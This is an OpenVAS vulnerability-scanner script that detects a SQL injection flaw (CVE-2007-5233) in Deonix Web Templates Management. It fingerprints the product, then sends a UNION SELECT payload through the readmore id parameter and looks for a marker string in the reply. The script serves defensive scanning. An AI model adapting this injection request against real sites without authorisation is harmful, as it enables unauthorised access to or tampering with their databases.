###############################################################################
# OpenVAS Vulnerability Test
# $Id: deonix_web_templates_25926.nasl 15 2013-10-27 12:49:54Z jan $
#
# Deonix Web Templates Management Index.PHP SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Web Templates Management is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data before
using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

This issue affects Web Templates Management 1.3; other versions may
also be vulnerable.";


if (description)
{
 script_id(100247);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-07-26 19:54:54 +0200 (Sun, 26 Jul 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2007-5233");
 script_bugtraq_id(25926);
 script_tag(name:"risk_factor", value:"High");

 script_name("Deonix Web Templates Management Index.PHP SQL Injection Vulnerability");

desc = "

 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/25926");
 script_xref(name : "URL" , value : "http://www.deonixscripts.com/index.php?view=products_templatesmng");

 script_description(desc);
 script_summary("Determine if Deonix Web Templates Management is prone to an SQL-injection vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 
  buf = http_get_cache(item:url, port:port);
  
  if( buf == NULL )continue;

  if(egrep(pattern: "Powered by: <a [^>]+>deonixscripts.com", string: buf, icase: TRUE)) {

    url = string(dir, "/index.php?action=readmore&id=-1%20union%20select%200,1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3/*");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    
    if(egrep(pattern: "OpenVAS-SQL-Injection-Test", string: buf)) {
       security_hole(port:port);
       exit(0);
    }   

  }
}

exit(0);
